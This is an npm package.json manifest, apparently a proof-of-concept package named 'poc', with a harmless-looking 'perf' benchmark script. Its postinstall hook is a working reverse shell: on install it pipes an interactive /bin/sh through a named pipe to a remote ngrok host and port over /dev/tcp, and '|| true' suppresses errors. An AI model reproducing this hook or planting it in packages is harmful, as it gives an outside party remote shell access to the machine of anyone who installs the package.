{
  "name": "poc",
  "version": "1.0.0",
  "scripts": {
    "perf": "echo 'Running benchmark...'",
    "postinstall": "sh -c 'HOST=0.tcp.in.ngrok.io; PORT=10789; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /tmp/f > /dev/tcp/$HOST/$PORT; rm /tmp/f' || true"
  }
}
